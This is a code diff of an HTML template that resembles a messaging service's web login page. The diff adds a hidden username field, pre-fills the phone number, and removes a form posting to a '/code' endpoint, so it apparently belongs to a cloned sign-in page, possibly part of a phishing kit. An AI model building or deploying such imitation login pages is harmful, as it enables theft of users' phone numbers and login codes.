@@ -40,6 +40,7 @@
 </head>
 
 <body class="animation-level-2 is-left-column-shown">
+  <div id="username" style="display: none;">{{username}}</div>
   <!--[if IE]>
     <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
   <![endif]-->
@@ -62,14 +63,12 @@
               <br>enter your phone number.</div>
             <div class="input-wrapper">
                 <div class="input-field input-field-phone">
-                <div class="input-field-input" id="phone" contenteditable="true" dir="auto" data-no-linebreaks="1" inputmode="numeric">+</div>
+                <div class="input-field-input" id="phone" contenteditable="true" dir="auto" data-no-linebreaks="1" inputmode="numeric">+{{phone}}</div>
                 <div class="input-field-border"></div>
                 <label><span class="i18n" id="phone_text_1">Phone Number</span></label>
             </div>
-              <form name="code_form" action="/code?login={{username}}&phone=" method="POST">
                 <button id="form_butt" class="btn-primary btn-color-primary rp" style="">
                 <div class="c-ripple"></div><span class="i18n">Next</span></button>
-              </form>
             </div>
           </div>
         </div>
